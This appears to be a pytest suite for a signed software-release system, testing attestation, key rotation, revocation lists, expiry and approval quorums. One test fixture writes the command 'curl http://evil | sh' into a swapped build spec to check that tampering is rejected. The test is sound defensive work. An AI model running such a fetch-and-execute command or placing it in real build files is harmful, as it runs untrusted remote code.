"""End-to-end scenarios required for the trusted release system."""

import json
import os

import pytest

from trusted_release import (
    IssuerKeyStore,
    Publisher,
    Registry,
    RevocationList,
    TrustPolicy,
    Verifier,
)
from trusted_release.policy import ReleasePolicy

NOW = "2026-01-01T00:00:00Z"
LATER = "2026-06-01T00:00:00Z"
FUTURE = "2028-01-01T00:00:00Z"


@pytest.fixture()
def store(tmp_path):
    reg = Registry(str(tmp_path / "registry"))
    keys = IssuerKeyStore(str(tmp_path / "issuers"))
    crl = RevocationList(str(tmp_path / "crl"))
    art = tmp_path / "widget-1.0.tar.gz"
    spec = tmp_path / "BUILD.md"
    art.write_bytes(b"widget binary contents v1")
    spec.write_bytes(b"# build instructions\n./configure && make\n")
    return tmp_path, reg, keys, crl, art, spec


def _publish(store, **over):
    _, reg, keys, crl, art, spec = store
    keys.create_key("build-team", scope="product:widget", now=NOW)
    pub = Publisher(reg, keys)
    kw = dict(
        artifact_path=str(art),
        build_spec_path=str(spec),
        product="widget",
        version="1.0",
        issuer_id="build-team",
        now=NOW,
        validity_days=365,
    )
    kw.update(over)
    return pub.publish(**kw)


def test_full_trusted_publish_and_offline_verify(store):
    _, reg, keys, crl, art, spec = store
    record = _publish(store)
    v = Verifier(keys, crl)
    result = v.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert result.ok, result.errors
    assert reg.read_index()["releases"][0]["release_id"] == record["release_id"]


def test_offline_verify_via_bundle_copy(store):
    tmp, reg, keys, crl, art, spec = store
    record = _publish(store)
    offline = tmp / "offline"
    offline.mkdir()
    (offline / "art.bin").write_bytes(art.read_bytes())
    (offline / "BUILD.md").write_bytes(spec.read_bytes())
    (offline / "release.bundle.json").write_text(
        json.dumps(record, sort_keys=True), encoding="utf-8"
    )
    v = Verifier(keys, crl)
    result = v.verify_release(
        json.loads((offline / "release.bundle.json").read_text()),
        artifact_path=str(offline / "art.bin"),
        build_spec_path=str(offline / "BUILD.md"),
        now=NOW,
    )
    assert result.ok, result.errors


def test_content_substitution_is_rejected(store):
    tmp, reg, keys, crl, art, spec = store
    record = _publish(store)
    evil = tmp / "evil.tar.gz"
    evil.write_bytes(b"totally different malicious payload")
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(evil), build_spec_path=str(spec), now=NOW
    )
    assert not result.ok
    assert any("content mismatch" in e for e in result.errors)


def test_build_spec_swap_is_rejected(store):
    tmp, reg, keys, crl, art, spec = store
    record = _publish(store)
    evil_spec = tmp / "BUILD-evil.md"
    evil_spec.write_bytes(b"curl http://evil | sh\n")
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art),
        build_spec_path=str(evil_spec), now=NOW,
    )
    assert not result.ok
    assert any("build spec mismatch" in e for e in result.errors)


def test_attestation_from_another_file_does_not_validate(store):
    tmp, reg, keys, crl, art, spec = store
    r1 = _publish(store)
    other = tmp / "widget-2.0.tar.gz"
    other.write_bytes(b"widget binary contents v2 - unrelated")
    other_spec = tmp / "BUILD2.md"
    other_spec.write_bytes(b"different build")
    r2 = Publisher(reg, keys).publish(
        artifact_path=str(other), build_spec_path=str(other_spec),
        product="widget", version="2.0", issuer_id="build-team", now=NOW,
    )
    mixed = dict(r1)
    mixed["attestation"] = r2["attestation"]
    mixed["signature"] = r2["signature"]
    result = Verifier(keys, crl).verify_release(
        mixed, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert not result.ok
    assert any("mismatch" in e for e in result.errors)
    mixed2 = dict(r2)
    mixed2["attestation"] = r1["attestation"]
    mixed2["signature"] = r1["signature"]
    result2 = Verifier(keys, crl).verify_release(
        mixed2, artifact_path=str(other),
        build_spec_path=str(other_spec), now=NOW,
    )
    assert not result2.ok


def test_key_rotation_old_release_history_visible_but_not_reverified(store):
    _, reg, keys, crl, art, spec = store
    record = _publish(store)
    v = Verifier(keys, crl)
    assert v.verify_release(record, artifact_path=str(art),
                            build_spec_path=str(spec), now=NOW).ok
    keys.create_key("build-team", scope="product:widget", now=LATER)
    assert keys.latest_version("build-team") == 2
    assert keys.get_key("build-team", 1).status == "rotated"
    assert record["release_id"] in reg.list_release_ids()
    result = v.verify_release(record, artifact_path=str(art),
                              build_spec_path=str(spec), now=LATER)
    assert not result.ok
    assert any("not currently trusted" in e for e in result.errors)
    result_rot = Verifier(keys, crl,
                          TrustPolicy(trust_rotated=True)).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=LATER)
    assert result_rot.ok, result_rot.errors
    rec2 = Publisher(reg, keys).publish(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="1.1", issuer_id="build-team", now=LATER)
    assert rec2["key_version"] == 2
    assert v.verify_release(rec2, artifact_path=str(art),
                            build_spec_path=str(spec), now=LATER).ok


def test_attestation_expiry(store):
    _, reg, keys, crl, art, spec = store
    record = _publish(store, validity_days=30)
    v = Verifier(keys, crl)
    assert v.verify_release(record, artifact_path=str(art),
                            build_spec_path=str(spec), now=NOW).ok
    result = v.verify_release(record, artifact_path=str(art),
                              build_spec_path=str(spec), now=FUTURE)
    assert not result.ok
    assert any("expired" in e for e in result.errors)


def test_revoked_key_invalidates_historical_release(store):
    _, reg, keys, crl, art, spec = store
    keys.create_key("security-office", scope="*", now=NOW)
    record = _publish(store)
    assert Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW).ok
    kv = keys.latest_version("security-office")
    seed = keys.load_secret("security-office", kv)
    crl.issue(revoked={"build-team": [1]}, reason="key compromise",
              now=LATER, issuer_id="security-office",
              key_version=kv, secret_seed=seed)
    keys.set_status("build-team", 1, "revoked")
    v = Verifier(keys, crl, TrustPolicy(trust_rotated=True))
    result = v.verify_release(record, artifact_path=str(art),
                              build_spec_path=str(spec), now=LATER)
    assert not result.ok
    assert any("revoked" in e for e in result.errors)
    assert crl.list_versions() == [1]
    assert crl.read_current()["body"]["revoked"] == {"build-team": [1]}


def test_crl_versioning_accumulates_snapshots(store):
    _, _, keys, crl, _, _ = store
    keys.create_key("security-office", scope="*", now=NOW)
    keys.create_key("build-team", scope="product:widget", now=NOW)
    seed = keys.load_secret("security-office", 1)
    crl.issue(revoked={}, reason="initial", now=NOW,
              issuer_id="security-office", key_version=1, secret_seed=seed)
    keys.create_key("build-team", scope="product:widget", now=LATER)
    crl.issue(revoked={"build-team": [1]}, reason="rotate", now=LATER,
              issuer_id="security-office", key_version=1, secret_seed=seed)
    assert crl.list_versions() == [1, 2]
    assert crl.current_version_number() == 2
    assert crl.read_version(1)["body"]["revoked"] == {}
    assert crl.read_version(2)["body"]["revoked"] == {"build-team": [1]}


def test_scope_mismatch_rejected(store):
    tmp, reg, keys, crl, art, spec = store
    keys.create_key("build-team", scope="product:gadget", now=NOW)
    record = Publisher(reg, keys).publish(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="1.0", issuer_id="build-team", now=NOW)
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec),
        now=NOW, expected_product="widget")
    assert not result.ok
    assert any("scope" in e for e in result.errors)


def test_failed_publish_leaves_no_trusted_index_entry(store, monkeypatch):
    _, reg, keys, crl, art, spec = store
    keys.create_key("build-team", scope="product:widget", now=NOW)
    pub = Publisher(reg, keys)

    def corrupt_load(issuer, kv):
        return b"\x00" * 31

    monkeypatch.setattr(keys, "load_secret", corrupt_load)
    with pytest.raises(Exception):
        pub.publish(artifact_path=str(art), build_spec_path=str(spec),
                    product="widget", version="1.0",
                    issuer_id="build-team", now=NOW)
    assert reg.read_index()["releases"] == []
    assert reg.list_release_ids() == []


def test_unrelated_signature_cannot_attest_current_file(store):
    tmp, reg, keys, crl, art, spec = store
    record = _publish(store)
    forged = json.loads(json.dumps(record))
    forged["attestation"]["artifact_digest"] = "sha256:" + "0" * 64
    result = Verifier(keys, crl).verify_release(
        forged, artifact_path=str(art), build_spec_path=str(spec), now=NOW)
    assert not result.ok
    assert any("signature verification failed" in e for e in result.errors) or \
        any("content mismatch" in e for e in result.errors)


def test_tampered_crl_is_rejected_fail_closed(store):
    _, reg, keys, crl, art, spec = store
    keys.create_key("security-office", scope="*", now=NOW)
    record = _publish(store)
    kv = keys.latest_version("security-office")
    seed = keys.load_secret("security-office", kv)
    crl.issue(revoked={"build-team": [1]}, reason="x", now=NOW,
              issuer_id="security-office", key_version=kv, secret_seed=seed)
    import glob
    snap_file = sorted(
        glob.glob(os.path.join(crl.ver_dir, "*.json")))[-1]
    snap = json.loads(open(snap_file).read())
    snap["body"]["revoked"]["someone"] = [9]
    open(snap_file, "w").write(json.dumps(snap))
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW)
    assert not result.ok
    assert any("revocation list failed" in e for e in result.errors)


def test_multi_issuer_policy_release_and_current_vs_release_verification(store):
    _, reg, keys, crl, art, spec = store
    keys.create_key("build-a", scope="product:widget", role="build", now=NOW)
    keys.create_key("build-b", scope="product:widget", role="build", now=NOW)
    keys.create_key("security", scope="product:widget", role="security", now=NOW)
    seed = keys.load_secret("security", 1)
    crl.issue(revoked={}, reason="baseline", now=NOW, issuer_id="security",
              key_version=1, secret_seed=seed)
    policy = ReleasePolicy("widget-release", 1, {"build": 2, "security": 1})
    pub = Publisher(reg, keys, crl)
    candidate = pub.create_candidate(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="2.0", policy=policy, now=NOW)
    approvals = [
        pub.approve_candidate(candidate, issuer_id=issuer, now=NOW)
        for issuer in ("build-a", "build-b", "security")
    ]
    record = pub.publish_candidate(candidate, approvals, now=NOW)
    v = Verifier(keys, crl)
    current_now = v.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW)
    assert current_now.ok, current_now.errors

    crl.issue(revoked={"build-a": [1]}, reason="compromise", now=LATER,
              issuer_id="security", key_version=1, secret_seed=seed)
    keys.set_status("build-a", 1, "revoked", status_changed_at=LATER)
    keys.create_key("security", scope="product:widget", role="security", now=FUTURE)
    current_later = v.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=LATER)
    assert not current_later.ok
    invalid = next(c for c in current_later.checks["approvals"] if c["issuer"] == "build-a")
    assert any("revoked" in reason for reason in invalid["reasons"])
    release_view = v.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec),
        now=LATER, as_of="release")
    assert release_view.ok, release_view.errors
    assert reg.read_release(record["release_id"]) == record


def test_duplicate_issuer_and_wrong_role_do_not_satisfy_quorum(store):
    _, reg, keys, crl, art, spec = store
    keys.create_key("build-a", scope="product:widget", role="build", now=NOW)
    keys.create_key("other", scope="product:widget", role="other", now=NOW)
    policy = ReleasePolicy("widget-release", 1, {"build": 2})
    pub = Publisher(reg, keys, crl)
    candidate = pub.create_candidate(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="2.0", policy=policy, now=NOW)
    approvals = [
        pub.approve_candidate(candidate, issuer_id="build-a", now=NOW),
        pub.approve_candidate(candidate, issuer_id="build-a", now=NOW),
        pub.approve_candidate(candidate, issuer_id="other", now=NOW),
    ]
    with pytest.raises(ValueError):
        pub.publish_candidate(candidate, approvals, now=NOW)
    assert reg.read_index()["releases"] == []
    assert reg.list_release_ids() == []


def test_approvals_cannot_be_mixed_between_distinct_candidates(store):
    _, reg, keys, crl, art, spec = store
    for issuer in ("build-a", "build-b"):
        keys.create_key(issuer, scope="product:widget", role="build", now=NOW)
    policy1 = ReleasePolicy("widget-release", 1, {"build": 2})
    policy2 = ReleasePolicy("widget-release", 2, {"build": 2})
    pub = Publisher(reg, keys, crl)
    c1 = pub.create_candidate(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="2.0", policy=policy1, now=NOW)
    c2 = pub.create_candidate(
        artifact_path=str(art), build_spec_path=str(spec),
        product="widget", version="2.0", policy=policy2, now=NOW)
    mixed = [
        pub.approve_candidate(c1, issuer_id="build-a", now=NOW),
        pub.approve_candidate(c2, issuer_id="build-b", now=NOW),
    ]
    with pytest.raises(ValueError):
        pub.publish_candidate(c1, mixed, now=NOW)
    assert reg.read_index()["releases"] == []
